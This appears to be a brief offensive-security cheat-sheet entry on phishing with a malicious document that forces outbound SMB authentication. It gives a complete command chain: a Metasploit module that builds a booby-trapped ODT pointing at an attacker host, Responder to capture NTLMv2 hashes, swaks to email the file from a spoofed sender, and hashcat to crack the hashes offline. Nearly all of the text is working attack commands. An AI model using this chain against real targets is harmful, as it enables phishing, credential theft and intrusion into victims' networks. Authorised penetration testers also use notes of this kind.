# Malicious Document Forcing Outbound SMB Auth (Phishing)

When a target accepts file uploads via email/a careers-style form, a document that embeds a UNC path triggers an outbound SMB auth attempt the moment it's opened — capture the NTLMv2 hash and crack offline.

```bash
msfconsole -q -x "use fileformat/odt_badodt; set LHOST <LHOST>; run; exit"   # or an equivalent malicious docx/lnk/url-file generator
sudo responder -I <iface>
swaks --to '<target-email>' --from '<spoofed-sender>' --header 'Subject: <subject>' \
  --body '<body>' --attach-type application/octet-stream --server <mail-server> --port 25 \
  --timeout 20s --attach @bad.odt
hashcat -a0 -m5600 captured.hash <WORDLIST>
```
